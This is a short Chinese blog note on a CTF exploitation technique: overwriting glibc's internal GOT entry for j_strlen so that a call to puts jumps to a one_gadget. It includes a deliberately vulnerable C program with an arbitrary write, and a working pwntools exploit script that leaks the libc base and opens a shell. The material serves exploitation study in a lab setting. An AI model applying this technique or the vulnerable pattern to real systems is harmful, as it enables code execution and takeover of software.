---
title: Glibc GOT表劫持
date: '2025-12-08 18:21:32'
updated: '2025-12-27 08:35:12'
---
glibc 里面其实也有 got 表，因为延迟绑定

为了性能，glibc 不可能在程序每次启动的时候把所有的符号地址都解析完再开始执行，这样启动时间太长

因为 libc 里面的函数肯定也会需要调用 libc 当中其他函数，所以就需要延迟绑定

# puts 函数
[https://c-lby.top/2024/hijack-libc-got/](https://c-lby.top/2024/hijack-libc-got/)

`puts` 函数在 libc 当中还会调用到 `j_strlen`

![](/images/a111944b82a3c8204e86b4a54bff505a.png)

![](/images/db2cec3bc066fc099aa030d742b3ea2c.png)

![](/images/74dc6e97736278dd41a57c7c3956ebd0.png)

然后就到 glibc 的 got 表了，劫持`j_strlen`的 got 表就可以让程序调用 puts 的时候调用到 ogg

> glibc 大部分延迟绑定的函数都是以 `j_`开头的
>

# Poc
在 miniVN 签到题想到的，直接把源码拿过来改了改，其实本来就很简洁，大道至简）

```c
#include <stdio.h>
#include <unistd.h>

int main(){
    setvbuf(stdout, 0, 2, 0);
    setvbuf(stdin, 0, 2, 0);
    setvbuf(stderr, 0, 2, 0);

    printf("I give you soemthing nice! Here: %p\n", &read);
    unsigned long addr;
    scanf("%lu", &addr);
    printf("%lx\n", addr);
    read(0, (void *)addr, 0x100);
    puts("write your words!"); //这句puts本来是在read之前的
}
```

exp：

```python
#!/usr/bin/env python3

from pwn import *
context.log_level = 'debug'
context.arch = 'amd64'

link=process("./glibcgot")
elf=ELF("./glibcgot")
libc=ELF("/home/garhin/glibc-all-in-one/libs/2.35-0ubuntu3.11_amd64/libc.so.6")

gdb.attach(link,'b *0x0000000004012AF')
pause()

link.recvuntil(b'Here: ')
read_addr=int(link.recv(14),16)
# success("read_addr: "+hex(read_addr))
libc_base=read_addr-libc.sym['read']
success("libc_base: "+hex(libc_base))

j_strlen=libc_base+0x000000000021A098
success("j_strlen: "+hex(j_strlen))

ogg=[0xebc81,0xebc81,0xebc88,0xebce2,0xebd38,0xebd3f,0xebd43]
one_gadget=libc_base+ogg[0]

link.sendline(str(j_strlen))
sleep(0.2)
link.send(p64(one_gadget))

link.interactive()
```

